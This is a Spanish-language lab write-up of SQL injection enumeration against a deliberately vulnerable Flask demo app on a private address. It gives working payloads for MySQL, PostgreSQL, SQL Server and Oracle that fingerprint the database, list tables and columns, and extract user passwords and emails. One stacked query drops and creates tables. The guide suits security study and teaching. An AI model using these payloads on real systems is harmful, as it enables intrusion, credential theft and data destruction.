# 🔍 SQL Injection Database Enumeration Guide

## 📝 Resumen Ejecutivo

Esta guía documenta las técnicas de enumeración sistemática para diferentes motores de base de datos a través de SQL injection, desarrollada mediante análisis empírico de la aplicación vulnerable en `http://192.168.1.3:5000/`.

## 🎯 Aplicación Objetivo

- **URL**: `http://192.168.1.3:5000/`
- **Tipo**: Flask SQL Injection Demo
- **Motores soportados**: MySQL, PostgreSQL, SQL Server, Oracle
- **Punto de inyección**: Parámetro `user` en endpoint `/query`

## 🔧 Metodología General

### 1. Validación de Conectividad
```bash
curl -X GET http://192.168.1.3:5000/
```

### 2. Identificación del Punto de Inyección
```bash
curl -X POST http://192.168.1.3:5000/query \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "database=mysql&user=test"
```

### 3. Descubrimiento de Número de Columnas
Usar técnica UNION SELECT con incremento de columnas hasta encontrar el número correcto.

---

## 🗄️ MYSQL ENUMERATION

### 📊 Información del Sistema
```sql
' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() -- 
```

### 🏗️ Enumeración de Tablas
```sql
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'mysql_tables',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() -- 
```

### 📋 Enumeración de Columnas
```sql
' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' -- 
```

### 📄 Extracción de Datos
```sql
' UNION SELECT id,username,password,email,created_at FROM users -- 
```

### ✅ Resultados MySQL
- **Base de datos**: `vulnerable_db`
- **Tablas**: `users`, `products`
- **Estructura users**: `id(int)`, `username(varchar)`, `password(varchar)`, `email(varchar)`, `created_at(datetime)`

---

## 🐘 POSTGRESQL ENUMERATION

### 📊 Información del Sistema
```sql
' UNION SELECT 1,version(),'postgresql',current_user,NOW() -- 
```

### 🏗️ Enumeración de Tablas (Stacked Queries)
```sql
'; DROP TABLE IF EXISTS temp_tables; CREATE TABLE temp_tables AS SELECT tablename FROM pg_tables WHERE schemaname='public'; -- 
```

### 📋 Consulta de Tablas Temporales
```sql
' UNION SELECT 1,tablename,'public','pg_tables',NOW()::text FROM temp_tables -- 
```

### 📄 Enumeración de Columnas
```sql
' UNION SELECT 999,column_name,data_type,'users_cols',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' -- 
```

### ✅ Resultados PostgreSQL
- **Motor**: PostgreSQL 13.21
- **Esquema**: `public`
- **Tablas**: `users`, `products`
- **Características**: Soporte completo para stacked queries
- **Nota**: Las tablas temporales no persisten entre consultas separadas

---

## 🏢 SQL SERVER ENUMERATION

### 📊 Información del Sistema
```sql
' UNION SELECT 1,@@VERSION,DB_NAME(),SYSTEM_USER,GETDATE() -- 
```

### 🏗️ Enumeración de Tablas
```sql
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'sqlserver_tables',GETDATE() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' -- 
```

### 📋 Enumeración de Columnas
```sql
' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'users_columns',GETDATE() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' -- 
```

### 📄 Extracción de Datos
```sql
' UNION SELECT id,username,password,email,created_at FROM users -- 
```

### ✅ Resultados SQL Server
- **Motor**: Microsoft SQL Server 2022
- **Base de datos**: `vulnerable_db`
- **Tablas**: `users`, `products`
- **Estructura completa**: Idéntica a MySQL

---

## 🔴 ORACLE ENUMERATION

### 🎯 Consideraciones Especiales Oracle
- **Estrictez de tipos**: Requiere compatibilidad exacta en UNION SELECT
- **Función de fecha**: `SYSDATE` en lugar de `NOW()`
- **Acceso mediante sinónimos**: Las tablas pueden estar en diferentes esquemas

### 📊 Información del Sistema
```sql
' UNION SELECT 999,USER,'oracle_system','discovery',SYSDATE FROM DUAL -- 
```

### 🔍 Descubrimiento de Tipos (Error-Based)
```sql
' UNION SELECT 'string',999,'test','oracle',SYSDATE FROM users -- 
```

### 🏗️ Enumeración de Tablas del Usuario
```sql
' UNION SELECT 999,TABLE_NAME,'USER_TABLES','oracle_enum',SYSDATE FROM USER_TABLES -- 
```

### 👁️ Enumeración de Vistas
```sql
' UNION SELECT 999,VIEW_NAME,'USER_VIEWS','oracle_views',SYSDATE FROM USER_VIEWS -- 
```

### 🔗 **CLAVE**: Enumeración de Sinónimos
```sql
' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'oracle_synonyms',SYSDATE FROM USER_SYNONYMS -- 
```

### 📋 Enumeración de Columnas (Tablas del Sistema)
```sql
' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'sys_products_cols',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='SYS' AND TABLE_NAME='PRODUCTS' -- 
```

### ✅ Resultados Oracle
- **Usuario actual**: `SYSTEM`
- **Descubrimiento clave**: Tablas accesibles vía sinónimos
  - `USERS` → `SYS.USERS`
  - `PRODUCTS` → `SYS.PRODUCTS`
- **Estructura SYS.PRODUCTS**: `ID(NUMBER)`, `NAME(VARCHAR2)`, `PRICE(NUMBER)`, `DESCRIPTION(CLOB)`, `CATEGORY(VARCHAR2)`

---

## 🧠 Lecciones Aprendidas

### 💡 Técnicas Críticas por Motor

#### MySQL
- ✅ INFORMATION_SCHEMA estándar
- ✅ Funciones de sistema integradas
- ✅ UNION SELECT directo

#### PostgreSQL
- ✅ Stacked queries habilitadas
- ✅ Casting explícito requerido (`::text`)
- ✅ `pg_tables` para metadatos

#### SQL Server
- ✅ INFORMATION_SCHEMA compatible
- ✅ `GETDATE()` para timestamps
- ✅ Enumeración estándar

#### Oracle
- ⚠️ **Estrictez de tipos crítica**
- 🔑 **Sinónimos ocultan ubicación real**
- 🎯 **Enumeración empírica esencial**
- 📊 **ALL_TAB_COLUMNS para esquemas cruzados**

### 🚨 Errores Comunes a Evitar

1. **Oracle**: No asumir nombres de tablas estándar
2. **PostgreSQL**: Olvidar casting de tipos
3. **General**: No validar número de columnas primero
4. **Oracle**: Ignorar sinónimos en la enumeración

### 🔄 Flujo de Trabajo Recomendado

1. **Identificar motor** → Información del sistema
2. **Descubrir tipos** → Error-based injection (Oracle)
3. **Enumerar metadatos** → Tablas, vistas, sinónimos
4. **Mapear estructura** → Columnas por tabla
5. **Extraer datos** → Payload final optimizado

---

## 📋 Payloads de Referencia Rápida

### Información del Sistema
```sql
-- MySQL/SQL Server
' UNION SELECT 1,@@version,DATABASE(),USER(),NOW() -- 

-- PostgreSQL
' UNION SELECT 1,version(),'postgresql',current_user,NOW() -- 

-- Oracle
' UNION SELECT 999,USER,'oracle',USER,SYSDATE FROM DUAL -- 
```

### Enumeración de Tablas
```sql
-- MySQL/SQL Server
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,'enum',NOW() FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() -- 

-- PostgreSQL (Stacked)
'; CREATE TABLE temp_enum AS SELECT tablename FROM pg_tables WHERE schemaname='public'; -- 

-- Oracle (Sinónimos)
' UNION SELECT 999,SYNONYM_NAME,TABLE_NAME,'synonyms',SYSDATE FROM USER_SYNONYMS -- 
```

### Enumeración de Columnas
```sql
-- MySQL/SQL Server
' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,'columns',NOW() FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='tabla' -- 

-- PostgreSQL
' UNION SELECT 999,column_name,data_type,'columns',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='tabla' -- 

-- Oracle
' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'columns',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='ESQUEMA' AND TABLE_NAME='TABLA' -- 
```

---

## 🎯 Conclusiones

Esta guía demuestra la importancia del **descubrimiento empírico** en SQL injection, especialmente para Oracle donde las tablas pueden estar ocultas detrás de sinónimos. Cada motor requiere técnicas específicas, pero la metodología sistemática garantiza enumeración completa independientemente del backend.

**🏆 Enumeración exitosa lograda en los 4 motores mediante técnicas adaptadas a cada arquitectura.**

---
*Documento generado el 3 de agosto de 2025 | Análisis de SQL Injection Multi-Motor*
